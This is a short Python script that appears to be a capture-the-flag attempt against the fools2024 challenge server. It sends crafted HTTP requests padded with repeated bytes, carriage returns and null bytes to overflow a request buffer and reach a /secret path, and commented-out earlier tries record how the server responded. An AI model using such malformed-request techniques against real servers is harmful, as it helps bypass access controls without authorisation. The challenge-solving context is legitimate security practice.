import foolsocket


def main():
    sock = foolsocket.FoolsSocket("fools2024.online", 26273)

    # SUFFIX = b"\r\n\r\n"
    # # TARGET = 253
    # TARGET = 256 - len(SUFFIX)
    # line = b'GET /secret?bepis'
    # line += b'A'* (TARGET - len(line))
    # line += SUFFIX

    # line = b'GET /secret?bepis\r\n\r\n'

    # line = b'GET /public\0?'
    # line += b'A' * 254 + b'\r'
    # line += b'B' * 254 + b'\r'
    # line += b'C' * 254 + b'\r'
    # line += b'D' * 254
    # line += b'\r\n\r\n'

    # Fills the entire wRequestData buffer
    # line = b'GET /secret?'
    # line += b'A\r' * ((2048 - 4 - len(line)) // 2)
    # line += b'\r\n\r\n'

    # Adding the null makes the server not complain about size
    # thus, the request is only handled until the first null byte
    # "HTTP" btw
    line = b'A' * 254
    line += b"\r\n\0"
    # 254 -> not mapped to any action
    # 255 -> request entity too large
    line += b'B' * 255
    line += b"\r\n\r\n"

    print("Sending line:", line, "of length:", len(line))

    sock.communicate(line)
    resp = sock.read_until_eof()
    print(resp)


if __name__ == "__main__":
    main()

